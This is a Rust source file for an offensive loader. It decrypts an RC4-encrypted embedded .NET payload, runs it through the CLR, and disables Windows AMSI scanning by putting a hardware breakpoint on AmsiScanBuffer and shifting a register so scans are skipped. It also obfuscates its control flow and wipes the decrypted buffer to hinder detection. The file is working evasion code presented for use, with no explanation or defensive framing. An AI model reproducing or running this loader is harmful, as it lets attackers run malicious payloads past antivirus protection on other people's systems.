use clroxide::clr::Clr;
use crypto::symmetriccipher::SynchronousStreamCipher;
use dinvk::{GetModuleHandle,GetProcAddress};
use hwbp::{Size, Condition, Context};
use hwbp::windows::CONTEXT;
use libloading::Library;
use zeroize::Zeroize;

fn hooked_method(ctx: &mut CONTEXT) {
    println!("[+] Breakpoint has been triggered\n[+] Hooking AmsiScanBuffer");
    ctx.Rcx += 27;
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    hwbp::init();

    // Collect Arguments
    let mut _args: Vec<String> = std::env::args().collect();
    _args.drain(0..1);
    let args: Vec<String> = _args.iter().map(|s| s.to_string()).collect();

    let buffer = include_bytes!("encr");

    // Decrypt the payload
    let mut cipher = crypto::rc4::Rc4::new(include_bytes!("../keyfile"));
    let mut o = buffer.clone();
    o.zeroize();
    cipher.process(&buffer[..], &mut o);

    cryptify::flow_stmt!();
    let mut clr = Clr::new(o.to_vec(), args)?;

    /////////////////////////////////////////////////////////////
    // AMSI Bypass
    /////////////////////////////////////////////////////////////
    // Step 1. Load amsi.dll into the process
    let lib = unsafe { Library::new("C:\\Windows\\System32\\amsi.dll").expect("Shit") };

    // Step 2. Get the address of the `AmsiScanbuffer`
    let amsi_dll = GetModuleHandle("amsi.dll", None);
    let addr = GetProcAddress(amsi_dll, "AmsiScanBuffer", None);
    println!(
        "[!] Found AMSI.DLL: {:?} \n[!] AmsiScanBuffer address: {:?}",
        amsi_dll, addr 
    );

    let mut ctx = Context::current().unwrap();
    let mut hwbp = ctx
        .unused()
        .unwrap()
        .watch_memory_execute(addr as _, hooked_method)
        .with_enabled(true)
        .with_condition(Condition::Execute)
        .with_size(Size::FourBytes)
        .with_callback(hooked_method)
        .build_and_set()
        .unwrap();

    match ctx.apply_for_current_thread() {
        Ok(_) => println!("[+] Hardware Breakpoint has been applied"),
        Err(e) => {
            eprintln!("[x] Failed with error: {e}");
            return Ok(());
        },
    }

    // Run the dotnet exe
    let results = clr.run()?;
    println!("[*] Results:\n\n{}", results);
    // Zero Buffer
    o.zeroize();

    // Restore Breakpoint
    hwbp.disable();
    ctx.set(&hwbp);
    ctx.apply_for_current_thread().expect("Failed to apply");
    hwbp::free();

    // Cleanup
    let _ = lib.close();
    Ok(())
}
